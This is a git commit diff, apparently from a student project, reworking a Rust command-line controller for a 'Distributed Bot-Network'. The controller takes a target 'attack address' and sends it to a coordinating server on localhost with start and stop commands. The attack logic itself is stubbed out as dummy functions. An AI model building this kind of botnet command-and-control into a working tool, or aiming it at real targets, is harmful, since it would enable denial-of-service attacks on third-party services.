6cfd104c6e1fecf37471754e573be527e2c11e87
Taras Yaroshko <taras.yaroshko@ucu.edu.ua>
2023-05-03 20:19:32 +0300

    Host done with dummy functions

--- bot_rust/src/host/src/main.rs
+++ bot_rust/src/host/src/main.rs
@@ -1,20 +1,19 @@
-use std::io::{stdin, stdout, Write};
+use std::io::{stdin};
 use serde_json;
-use std::io;
-use core::error::Error;
 
 struct Host {
     server_address: String,
     attack_address: String,
-    num_requests: i32,
+    client: reqwest::blocking::Client,
 }
 
 impl Host {
     fn new(server_address: String) -> Self {
+        let client = reqwest::blocking::Client::new();
         Host {
             server_address,
             attack_address: String::new(),
-            num_requests: 0,
+            client
         }
     }
 
@@ -22,83 +21,59 @@ impl Host {
         attack_address.starts_with("http://") || attack_address.starts_with("https://")
     }
 
-    fn validate_requests_amount(num_requests: &str) -> bool {
-        num_requests.parse::<i32>().map_or(false, |n| n > 0)
-    }
-
     fn set_attack_address(&mut self) {
         println!("Enter attack address: ");
         let mut inp = String::new();
-        stdin().read_line(&mut inp)?;
+        stdin().read_line(&mut inp).unwrap();
 
-        let attack_address = inp.trim();
-        while !self::validate_attack_address(attack_address) {
-            println!("Invalid attack address");
-            println!("Enter attack address: ");
-            stdout().flush().unwrap();
+        while !Self::validate_attack_address(inp.trim()) {
+            println!("Invalid attack address. Please enter a valid attack address: ");
             inp.clear();
-            stdin().read_line(&mut inp)?;
+            stdin().read_line(&mut inp).unwrap();
         }
-        self.attack_address = attack_address.to_owned();
-    }
-
-    fn set_requests_amount(&mut self) {
-        println!("Enter number of requests: ");
-        let mut inp = String::new();
-        stdin().read_line(&mut inp)?;
-
-        let num_requests = inp.trim();
-        while !self::validate_requests_amount(num_requests) {
-            println!("Invalid number of requests");
-            println!("Enter number of requests: ");
-            stdout().flush().unwrap();
-            inp.clear();
-            stdin().read_line(&mut inp)?;
-        }
-        self.num_requests = num_requests.parse().unwrap();
+        self.attack_address = inp.trim().to_owned();
     }
 
     fn send_attack_info(&self) {
         let attack_info = serde_json::json!({
             "attack_address": &self.attack_address,
-            "requests_amount": self.num_requests,
         });
 
-        let client = client::new();
-        let res = client
-            .post(&format!("http://{}/attack_info", self.server_address))
-            .json(&attack_info)
-            .send()?;
+        let req = self.client.post(&format!("http://{}/attack_info", self.server_address)).json(&attack_info).send().unwrap();
     }
 
-    fn _receive_attack_info(&mut self) {
-        // let client = Client::new();
-        let res = client
-            .get(&format!("http://{}/attack_info", self.server_address))
-            .send()?;
+    fn receive_attack_info(&mut self) {
+        let res = self.client.get(&format!("http://{}/attack_info", self.server_address)).send().unwrap().json::<serde_json::Value>().unwrap();
     }
+
     fn start_attack(&mut self) {
+        if !self.attack_address.is_empty() {
+            self.send_attack_info();
+        }
+    }
+
+    fn stop_attack(&mut self) {
+        self.attack_address = String::new();
         self.send_attack_info();
     }
 }
 
 fn set_attack_info(host_: &mut Host) {
-    hoster.set_attack_address();
-    hoster.set_requests_amount();
+    host_.set_attack_address();
     println!("Attack info set successfully");
 }
 
-fn start_attack_wrapper(host_: &mut host::Host) {
-    host_.start_attack();
+fn start_attack_wrapper(host_: &mut Host) {
+    host_.send_attack_info();
     println!("Started attacking...");
 }
 
-fn stop_attack_wrapper(host_: &mut host::Host) {
+fn stop_attack_wrapper(host_: &mut Host) {
     host_.stop_attack();
     println!("Stopped attacking");
 }
 
-fn print_info() {
+fn print_info(_host_: &mut Host) {
     println!("Main commands:");
     println!("1. Type 'set' to set attack info.");
     println!("2. Type 'help' to see the list of available options.");
@@ -107,15 +82,14 @@ fn print_info() {
 }
 
 fn main() {
-    let mut host = Host::new(String::from("http://localhost8000"));
-    let server_address = ("0.0.0.0", 8000);
-    let mut host_ = host::Host::new(&format!("{}:{}", server_address.0, server_address.1));
+    let server_address = String::from("https://localhost:8000");
+    let mut host = Host::new(server_address);
 
     let inp_options = vec![
-        ("set", set_attack_info as fn(&mut host::Host)),
-        ("help", print_info as fn()),
-        ("start", start_attack_wrapper as fn(&mut host::Host)),
-        ("stop", stop_attack_wrapper as fn(&mut host::Host)),
+        ("set", set_attack_info as fn(&mut Host)),
+        ("help", print_info as fn(&mut Host)),
+        ("start", start_attack_wrapper as fn(&mut Host)),
+        ("stop", stop_attack_wrapper as fn(&mut Host)),
     ];
 
     println!("Distributed Bot-Network Command Line Interface");
@@ -131,14 +105,16 @@ fn main() {
         if inp == "exit" {
             break;
         }
-        match inp_options.get(inp) {
-            Some(func) => func(&mut host_),
-            None => {
-                println!(
-                    "Unknown option. \nType 'help' to see the list of all available options."
-                );
-                continue;
-            }
+
+        match inp_options.iter().find(|&x| x.0 == inp) {
+            Some(x) => {
+                if x.0 == "help" {
+                    x.1(&mut host);
+                } else {
+                    x.1(&mut host);
+                }
+            },
+            None => println!("Invalid command.\nType 'help' to see the list of available options."),
         }
     }
 }
